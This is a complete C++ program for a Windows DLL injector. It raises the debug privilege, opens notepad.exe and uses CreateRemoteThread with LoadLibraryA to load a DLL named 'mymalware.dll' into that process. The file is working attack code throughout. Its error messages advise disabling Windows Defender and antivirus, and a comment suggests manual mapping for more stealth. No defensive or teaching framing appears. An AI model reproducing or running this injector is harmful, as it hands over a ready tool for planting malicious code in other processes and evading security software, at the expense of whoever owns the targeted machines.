#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>

DWORD FindProcessId(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;

    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return pid;
}

// Enable debug privilege for the current process
bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    
    return result;
}

int main() {
    std::cout << "=== DLL Injector (Improved) ===" << std::endl;
    
    // Enable debug privilege
    if (EnableDebugPrivilege()) {
        std::cout << "Debug privilege enabled" << std::endl;
    } else {
        std::cout << "Warning: Could not enable debug privilege" << std::endl;
    }

    const char* dllPath = "mymalware.dll";
    const char* targetProcess = "notepad.exe";

    // Check if DLL exists
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        std::cout << "ERROR: " << dllPath << " not found!" << std::endl;
        system("pause");
        return 1;
    }

    // Get full path to DLL
    char fullDllPath[MAX_PATH];
    GetFullPathNameA(dllPath, MAX_PATH, fullDllPath, NULL);
    std::cout << "DLL: " << fullDllPath << std::endl;

    // Find target process
    DWORD pid = FindProcessId(targetProcess);
    if (pid == 0) {
        std::cout << "ERROR: " << targetProcess << " not running!" << std::endl;
        std::cout << "Please start Notepad first." << std::endl;
        system("pause");
        return 1;
    }

    std::cout << "Target: " << targetProcess << " (PID: " << pid << ")" << std::endl;

    // Try different permission combinations
    HANDLE hProcess = NULL;
    DWORD desiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    
    hProcess = OpenProcess(desiredAccess, FALSE, pid);
    
    if (!hProcess) {
        // Try with all access
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }
    
    if (!hProcess) {
        DWORD err = GetLastError();
        std::cout << "ERROR: Cannot open process (Error: " << err << ")" << std::endl;
        
        if (err == 5) {
            std::cout << "ACCESS DENIED - Solutions:" << std::endl;
            std::cout << "1. Run this program as Administrator" << std::endl;
            std::cout << "2. Disable Windows Defender/antivirus temporarily" << std::endl;
            std::cout << "3. Use 64-bit version if target is 64-bit" << std::endl;
            std::cout << "4. Try a different process (like explorer.exe)" << std::endl;
        }
        system("pause");
        return 1;
    }

    // Allocate memory for DLL path
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, strlen(fullDllPath) + 1, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMemory) {
        std::cout << "ERROR: Cannot allocate memory" << std::endl;
        CloseHandle(hProcess);
        system("pause");
        return 1;
    }

    // Write DLL path
    if (!WriteProcessMemory(hProcess, remoteMemory, fullDllPath, strlen(fullDllPath) + 1, NULL)) {
        std::cout << "ERROR: Cannot write to process memory" << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        system("pause");
        return 1;
    }

    // Get LoadLibrary address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");

    std::cout << "LoadLibraryA address: " << loadLibraryAddr << std::endl;
    std::cout << "Injecting..." << std::endl;

    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loadLibraryAddr, remoteMemory, 0, NULL);
    if (hThread) {
        std::cout << "SUCCESS: DLL injected!" << std::endl;
        
        WaitForSingleObject(hThread, 5000);
        
        DWORD exitCode;
        GetExitCodeThread(hThread, &exitCode);
        if (exitCode != 0) {
            std::cout << "DLL loaded successfully at: 0x" << std::hex << exitCode << std::dec << std::endl;
        }
        
        CloseHandle(hThread);
    } else {
        DWORD err = GetLastError();
        std::cout << "ERROR: Failed to create remote thread (Error: " << err << ")" << std::endl;
        
        // Alternative: Try manual mapping or different injection technique
        std::cout << "Trying alternative approach..." << std::endl;
        
        // You could implement manual mapping here for more stealth
    }

    // Cleanup
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "Injection process completed." << std::endl;
    system("pause");
    return 0;
}